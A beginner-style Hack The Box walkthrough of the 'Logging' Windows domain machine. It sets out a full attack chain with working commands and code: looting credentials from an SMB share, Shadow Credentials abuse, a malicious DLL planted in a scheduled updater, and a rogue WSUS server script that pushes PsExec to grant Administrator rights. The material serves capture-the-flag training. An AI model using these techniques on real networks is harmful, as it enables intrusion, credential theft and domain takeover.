# Logging (Hack The Box) – Simple Step-by-Step Walkthrough

  

> Beginner-friendly writeup for the **Logging** machine.

>

> This writeup explains **what to do**, **why we do it**, **what output matters**, and **common mistakes**.

  

---

  

## Machine Info

  

- **Box:** Logging

- **Difficulty:** Medium

- **OS:** Windows

- **Domain:** `logging.htb`

- **DC:** `DC01.logging.htb`

  

### Starting credentials

  

HTB gives us:

  

- **Username:** `wallace.everette`

- **Password:** `Welcome2026@`

  

### Example IPs used in this writeup

  

These change when HTB resets the machine, so replace them with your own.

  

- **Target IP:** `10.129.22.91`

- **Kali IP:** `10.10.17.87`

  

---

  

## Final Attack Path (High Level)

  

1. Log in with the provided user.

2. Read the `Logs` SMB share.

3. Find leaked service credentials in a log file.

4. Use `svc_recovery` to abuse **GenericWrite** over `msa_health$`.

5. Add **Shadow Credentials** to `msa_health$` and get a TGT.

6. WinRM to the DC as `msa_health$`.

7. Abuse a local updater that runs as `jaylee.clifton`.

8. Use that updater to get code execution as Jaylee.

9. Use Jaylee to request a certificate for `wsus.logging.htb`.

10. Stand up a rogue WSUS server on Kali.

11. Force the DC to contact your WSUS.

12. Add `msa_health$` to local Administrators.

13. Reconnect with a **fresh** token.

14. Read the root flag.

  

---

  

# 0) Preparation

  

## Add names to `/etc/hosts`

  

Kerberos and Windows tooling work better when names resolve correctly.

  

```bash

TARGET=10.129.22.91

LHOST=10.10.17.87

  

echo "$TARGET dc01.logging.htb dc01 logging.htb hr01.logging.htb" | sudo tee -a /etc/hosts

```

  

## Sync time with the DC

  

Kerberos is sensitive to clock drift.

  

```bash

sudo ntpdate $TARGET || sudo ntpdig $TARGET

```

  

---

  

# 1) Enumerate SMB with the provided user

  

Check what shares the starting user can access.

  

```bash

nxc smb $TARGET -d logging.htb -u wallace.everette -p 'Welcome2026@' --shares

```

  

Important result:

  

- The **`Logs`** share is readable.

  

That is the first big clue because the machine is called **Logging**.

  

---

  

# 2) Download the log files

  

Create a working directory and pull everything from the `Logs` share.

  

```bash

mkdir -p ~/loot/logs

cd ~/loot/logs

  

smbclient //${TARGET}/Logs -U "logging.htb/wallace.everette%Welcome2026@" -c 'recurse ON; prompt OFF; mget *'

```

  

Now search the logs for passwords, usernames, connection strings, LDAP binds, errors, and anything that looks useful.

  

```bash

rg -n -i '(pass|password|pwd|secret|token|apikey|api key|conn|connection|string|server=|uid=|user id=|username|credential|auth|bind|ldap|sql|task|schtasks|powershell|cmd\.exe|runas|net use|error|exception|failed)' .

```

  

### Important hit

  

Inside `IdentitySync_Trace_20260219.log` we find this:

  

```text

BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025"

```

  

That looks like real domain credentials leaked in a debug log.

  

---

  

# 3) Test the leaked service account

  

Try the leaked credentials first.

  

```bash

nxc smb $TARGET -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'

nxc winrm $TARGET -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'

nxc ldap $TARGET -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'

```

  

### Important lesson

  

The log password was **stale**.

  

The password that actually worked in this solve was:

  

```text

Em3rg3ncyPa$$2026

```

  

So test Kerberos directly:

  

```bash

impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' -dc-ip $TARGET

export KRB5CCNAME=$PWD/svc_recovery.ccache

klist

```

  

If you get a TGT, the service account is valid and usable.

  

---

  

# 4) Find the important AD relationship

  

Use BloodHound or LDAP enumeration.

  

The key relationship for this machine is:

  

- **`svc_recovery` has `GenericWrite` over `msa_health$`**

  

That is the edge we abuse.

  

`msa_health$` is a **gMSA** (group managed service account).

  

---

  

# 5) Abuse `GenericWrite` on `msa_health$` with Shadow Credentials

  

Since we can write to the `msa_health$` object, we can add a **KeyCredentialLink** (Shadow Credentials) and then authenticate as that account with PKINIT.

  

## Add shadow credentials

  

```bash

mkdir -p shadow_msa

  

bloodyAD --host dc01.logging.htb --dc-ip $TARGET -d logging.htb -u svc_recovery -k \

add shadowCredentials --path ./shadow_msa msa_health$

```

  

This creates files like:

  

- `shadow_msa_cert.pem`

- `shadow_msa_priv.pem`

  

## Get a TGT as `msa_health$`

  

```bash

python3 ~/Downloads/gettgtpkinit.py \

-cert-pem ./shadow_msa_cert.pem \

-key-pem ./shadow_msa_priv.pem \

logging.htb/msa_health$ \

./msa_health.ccache

  

export KRB5CCNAME=$PWD/msa_health.ccache

klist

```

  

## Connect with Evil-WinRM

  

```bash

evil-winrm -i dc01.logging.htb -r LOGGING.HTB

```

  

If it worked:

  

```powershell

whoami

# logging\msa_health$

```

  

---

  

# 6) Local recon as `msa_health$`

  

Now switch from AD abuse to local recon on the DC.

  

Important discoveries:

  

- There is a custom folder: `C:\ProgramData\UpdateMonitor`

- There is a repeating scheduled task: **`UpdateChecker Agent`**

- There is a custom application: `C:\Program Files\UpdateMonitor\UpdateMonitor.exe`

  

We eventually confirmed:

  

- the task runs as **`jaylee.clifton`**

- the updater checks `C:\ProgramData\UpdateMonitor\Settings_Update.zip`

- it extracts the ZIP into `C:\Program Files\UpdateMonitor\bin\`

- it loads `settings_update.dll`

- it looks for an export named **`PreUpdateCheck`**

  

That is the local privesc path.

  

---

  

# 7) Reverse the updater behavior

  

The log file was the first clue:

  

```powershell

Get-Content C:\ProgramData\UpdateMonitor\Logs\monitor.log -Tail 50

```

  

You will see lines like:

  

```text

Checking for update on local server...

No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.

Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll

```

  

After dropping a ZIP correctly:

  

```text

Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\

Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll

```

  

We also dumped the .NET IL from `UpdateMonitor.exe` and confirmed it does this:

  

- calls `LoadLibrary`

- calls `GetProcAddress`

- requests export name **`PreUpdateCheck`**

  

So our malicious DLL must be:

  

- **native**, not .NET

- export **`PreUpdateCheck`** exactly

- placed at the **root** of the ZIP archive

  

---

  

# 8) Build the malicious updater DLL

  

A small proof-of-execution DLL looked like this:

  

```c

#include <windows.h>

  

__declspec(dllexport) void PreUpdateCheck(void) {

STARTUPINFOW si;

PROCESS_INFORMATION pi;

WCHAR cmd[] = L"cmd.exe /c whoami > C:\\ProgramData\\proof.txt";

  

ZeroMemory(&si, sizeof(si));

ZeroMemory(&pi, sizeof(pi));

si.cb = sizeof(si);

  

CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

  

if (pi.hProcess) CloseHandle(pi.hProcess);

if (pi.hThread) CloseHandle(pi.hThread);

}

  

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

return TRUE;

}

```

  

Export file:

  

```def

LIBRARY settings_update

EXPORTS

PreUpdateCheck

```

  

Compile:

  

```bash

i686-w64-mingw32-gcc -shared -O2 -s -o settings_update.dll settings_update.c settings_update.def

```

  

## Important ZIP layout note

  

This matters a lot.

  

### Wrong

  

```text

bin/settings_update.dll

```

  

That gets extracted as:

  

```text

C:\Program Files\UpdateMonitor\bin\bin\settings_update.dll

```

  

### Correct

  

```text

settings_update.dll

```

  

A very easy way to build the ZIP correctly on the target was:

  

```powershell

Compress-Archive -LiteralPath 'C:\Users\msa_health$\Documents\settings_update.dll' \

-DestinationPath 'C:\Users\msa_health$\Documents\Settings_Update.zip' -Force

```

  

Then copy it into the watched path:

  

```powershell

Copy-Item 'C:\Users\msa_health$\Documents\Settings_Update.zip' \

-Destination 'C:\ProgramData\UpdateMonitor\Settings_Update.zip' -Force

```

  

### Proof of execution

  

After the updater ran:

  

```powershell

type C:\ProgramData\proof.txt

# logging\jaylee.clifton

```

  

That proves our DLL is executed as **Jaylee**.

  

---

  

# 9) Get the user flag

  

Once we had code execution as Jaylee, we used the DLL to copy files we needed.

  

User flag:

  

```text

734a[redacted]f4984460f5

```

  

---

  

# 10) Why Jaylee matters

  

From the Jaylee execution context we confirmed:

  

- **`jaylee.clifton` is in the `IT` group**

  

That matters because the `IT` group can use the **`UpdateSrv`** certificate template.

  

---

  

# 11) Request a certificate for `wsus.logging.htb`

  

The correct path here is **not** “get an Administrator cert directly.”

  

The intended move is:

  

- create a CSR for `wsus.logging.htb`

- submit it using the `UpdateSrv` template

- receive a certificate for `wsus.logging.htb`

- use that certificate to impersonate a WSUS server

  

## Create the CSR on Kali

  

```bash

cat > build_csr.py <<'EOF'

from cryptography import x509

from cryptography.x509.oid import NameOID

from cryptography.hazmat.primitives import hashes, serialization

from cryptography.hazmat.primitives.asymmetric import rsa

  

pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)

open('wsus_key.pem', 'wb').write(

pk.private_bytes(

serialization.Encoding.PEM,

serialization.PrivateFormat.TraditionalOpenSSL,

serialization.NoEncryption()

)

)

  

csr = (

x509.CertificateSigningRequestBuilder()

.subject_name(x509.Name([

x509.NameAttribute(NameOID.COMMON_NAME, 'wsus.logging.htb')

]))

.add_extension(

x509.SubjectAlternativeName([x509.DNSName('wsus.logging.htb')]),

critical=False

)

.sign(pk, hashes.SHA256())

)

  

open('req.csr', 'wb').write(csr.public_bytes(serialization.Encoding.DER))

EOF

  

python3 build_csr.py

```

  

This gives you:

  

- `req.csr`

- `wsus_key.pem`

  

## Upload the CSR to the target

  

```powershell

Invoke-WebRequest -Uri http://10.10.17.87:8000/req.csr -OutFile C:\ProgramData\UpdateMonitor\req.csr

```

  

## Submit the CSR using the updater (so it runs as Jaylee)

  

We used a DLL whose `PreUpdateCheck` function ran:

  

```text

certreq -f -submit -attrib "CertificateTemplate:UpdateSrv" -config "DC01.logging.htb\logging-DC01-CA" C:\ProgramData\UpdateMonitor\req.csr C:\ProgramData\UpdateMonitor\cert.cer > C:\ProgramData\UpdateMonitor\submit_log.txt 2>&1

```

  

The important detail is that **the updater runs this as Jaylee**, not as `msa_health$`.

  

After that, `cert.cer` was created.

  

## Recover the certificate

  

On the target:

  

```powershell

certutil -encode C:\ProgramData\UpdateMonitor\cert.cer C:\ProgramData\UpdateMonitor\cert.cer.b64

type C:\ProgramData\UpdateMonitor\cert.cer.b64

```

  

Copy the block to Kali and decode it:

  

```bash

awk '/BEGIN CERTIFICATE/{flag=1;next}/END CERTIFICATE/{flag=0}flag' cert.outer.txt \

| tr -d '\r\n' \

| base64 -d > wsus_cert.pem

  

openssl x509 -in wsus_cert.pem -noout -subject -issuer -dates

```

  

You should see something like:

  

```text

subject=CN=wsus.logging.htb

issuer=DC=htb, DC=logging, CN=logging-DC01-CA

```

  

Now you have:

  

- `wsus_key.pem`

- `wsus_cert.pem`

  

---

  

# 12) Run a rogue WSUS server on Kali

  

Now we impersonate `wsus.logging.htb` and serve a malicious update.

  

## Install `wsuks`

  

Use a virtual environment on Kali:

  

```bash

python3 -m venv .venv

source .venv/bin/activate

pip install wsuks

```

  

## Prepare the payload

  

We used `PsExec64.exe` and made it run:

  

```text

net localgroup administrators msa_health$ /add

```

  

That is the privilege escalation step.

  

## Run the rogue WSUS

  

A working version based on the solve:

  

```python

import ssl, sys, os, threading

from functools import partial

from http.server import HTTPServer

  

sys.modules['wsuks.lib.router'] = type(sys)('stub')

sys.modules['wsuks.lib.router'].Router = object

  

from wsuks.lib.logger import initLogger

from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer

  

initLogger(debug=False)

  

HOST = '10.10.17.87'

EXE = '/tmp/PsExec64.exe'

  

COMMAND = (

'/accepteula /s cmd.exe /c '

'"net localgroup administrators msa_health$ /add > C:\\ProgramData\\pwn.txt 2>&1 & '

'net localgroup administrators >> C:\\ProgramData\\pwn.txt 2>&1 & '

'icacls C:\\ProgramData\\pwn.txt /grant Everyone:F >nul 2>&1"'

)

  

exe_bytes = open(EXE, 'rb').read()

handler = WSUSUpdateHandler(exe_bytes, os.path.basename(EXE), f'http://{HOST}:8530')

handler.set_resources_xml(COMMAND)

  

def serve(port, use_tls):

httpd = HTTPServer((HOST, port), partial(WSUSBaseServer, handler))

if use_tls:

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)

ctx.load_cert_chain('wsus_cert.pem', 'wsus_key.pem')

httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

print(f'[+] HTTPS WSUS on {HOST}:{port}')

else:

print(f'[+] HTTP content on {HOST}:{port}')

httpd.serve_forever()

  

threading.Thread(target=serve, args=(8530, False), daemon=True).start()

serve(8531, True)

```

  

When the server is running, you should see:

  

```text

[+] HTTP content on 10.10.17.87:8530

[+] HTTPS WSUS on 10.10.17.87:8531

```

  

---

  

# 13) Make sure `wsus.logging.htb` resolves to Kali

  

The target must resolve:

  

```text

wsus.logging.htb -> 10.10.17.87

```

  

Check on the target:

  

```powershell

reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /s

Resolve-DnsName wsus.logging.htb

ping wsus.logging.htb

```

  

Important policy values:

  

- `WUServer = https://wsus.logging.htb:8531`

- `WUStatusServer = https://wsus.logging.htb:8531`

  

If the name does not resolve, fix DNS first.

  

---

  

# 14) Force Windows Update to contact the rogue WSUS

  

From the `msa_health$` shell:

  

```powershell

wuauclt /resetauthorization /detectnow

wuauclt /reportnow

usoclient StartScan

usoclient RefreshSettings

usoclient ScanInstallWait

```

  

You do **not** need to stop `wuauserv` if you are not already admin.

  

## What success looks like on Kali

  

In the `wsuks` terminal you should see:

  

- `GetConfig`

- `GetCookie`

- `SyncUpdates`

- `GetExtendedUpdateInfo`

- GET requests for `PsExec64.exe`

  

That means the DC trusted your rogue WSUS and downloaded your payload.

  

---

  

# 15) Confirm local admin access

  

Back in the `msa_health$` shell:

  

```powershell

type C:\ProgramData\pwn.txt

net localgroup administrators

```

  

Important result:

  

```text

Administrator

Domain Admins

Enterprise Admins

msa_health$

toby.brynleigh

```

  

Now `msa_health$` is in local Administrators.

  

---

  

# 16) Refresh your token

  

This part is extremely important.

  

If you try to read the flag in the **same** WinRM session, you can still get **Access is denied** because your token was created **before** the group membership changed.

  

So:

  

1. Exit the shell

2. Start a **fresh** Evil-WinRM session as `msa_health$`

  

```bash

export KRB5CCNAME=$PWD/msa_health.ccache

evil-winrm -i dc01.logging.htb -r LOGGING.HTB

```

  

---

  

# 17) Read the root flag

  

In the **new** session:

  

```powershell

type C:\Users\toby.brynleigh\Desktop\root.txt

```

  

Root flag:

  

```text

3ac4d70[redacted]84529f773

```

  

---

  

# Final Flags

  

## User flag

  

```text

734a6d[redacted]4984460f5

```

  

## Root flag

  

```text

3ac4d[redacted]529f773

```

  

---

  

# Common Pitfalls

  

## 1) The leaked password in the log was stale

  

The log showed:

  

```text

Em3rg3ncyPa$$2025

```

  

But the password that actually worked for `svc_recovery` was:

  

```text

Em3rg3ncyPa$$2026

```

  

## 2) Kerberos breaks if time is off

  

Always sync with the DC:

  

```bash

sudo ntpdate $TARGET

```

  

## 3) Kerberos/WinRM breaks if your hosts file still points to an old HTB IP

  

When HTB resets the box, update `/etc/hosts`.

  

## 4) The updater ZIP structure matters

  

Wrong:

  

```text

bin/settings_update.dll

```

  

Correct:

  

```text

settings_update.dll

```

  

## 5) The updater needs a very specific export name

  

The export must be:

  

```text

PreUpdateCheck

```

  

If not, you will see:

  

```text

'PreUpdateCheck' not found in settings_update.dll. Continuing...

```

  

## 6) Reconnect after adding `msa_health$` to Administrators

  

The old WinRM shell keeps the old token.

  

Open a **new** session before reading the root flag.

  

---

  

# Very Short Summary

  

We used the provided user to read a log share, found leaked service credentials, abused `GenericWrite` on `msa_health$` with Shadow Credentials, got a shell as `msa_health$`, abused a custom updater that ran our DLL as `jaylee.clifton`, used Jaylee’s `IT` membership to request a WSUS certificate, stood up a rogue WSUS server, forced the DC to fetch a malicious update, added `msa_health$` to local Administrators, reconnected, and read the root flag.
